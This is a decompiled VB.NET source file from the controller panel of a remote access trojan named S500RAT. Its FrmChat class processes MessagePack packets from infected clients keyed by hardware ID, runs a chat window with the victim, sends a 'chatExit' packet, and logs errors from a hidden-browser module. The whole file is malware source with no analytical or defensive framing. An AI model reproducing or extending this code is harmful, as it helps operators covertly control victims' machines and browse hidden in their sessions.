Imports System
Imports System.Drawing
Imports System.Threading
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000043 RID: 67
	Public Class FrmChat
		' Token: 0x0600117B RID: 4475 RVA: 0x00097518 File Offset: 0x00095718
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				If Operators.CompareString(asString, "setClient", False) <> 0 Then
					If Operators.CompareString(asString, "Read", False) <> 0 Then
						If Operators.CompareString(asString, "Error", False) = 0 Then
							Dim formHBrowser As FormHBrowser = CType(Application.OpenForms("FormHBrowser" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHBrowser)
							Dim flag As Boolean = formHBrowser IsNot Nothing
							If flag Then
								formHBrowser.StateHApp.ForeColor = Color.Red
								formHBrowser.StateHApp.Text = "Error : " + unpack_msgpack.ForcePathObject("Error").AsString
							End If
						End If
					Else
						Dim formChat As FormChat = CType(Application.OpenForms("FormChat" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormChat)
						Dim flag2 As Boolean = formChat IsNot Nothing
						If flag2 Then
							Console.Beep()
							formChat.richTextBox1.SelectionColor = Color.Orange
							formChat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString)
							formChat.richTextBox1.SelectionColor = Color.White
							formChat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput2").AsString)
							formChat.richTextBox1.SelectionStart = formChat.richTextBox1.TextLength
							formChat.richTextBox1.ScrollToCaret()
						Else
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "chatExit"
							ThreadPool.QueueUserWorkItem(AddressOf client.SendByte, msgPack.Encode2Bytes())
							client.Disconnected()
						End If
					End If
				Else
					Dim formChat2 As FormChat = CType(Application.OpenForms("FormChat" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormChat)
					Dim flag3 As Boolean = formChat2 IsNot Nothing
					If flag3 Then
						Dim flag4 As Boolean = formChat2.Client Is Nothing
						If flag4 Then
							client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString
							formChat2.Client = client
							formChat2.Timer1.Enabled = True
							formChat2.NicnameText.Enabled = True
							formChat2.richTextBox1.Visible = True
							formChat2.TextBox1.Visible = True
						End If
					End If
				End If
			Catch ex As Exception
				ListLogs.AddArray("Hidden Browser " + client.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
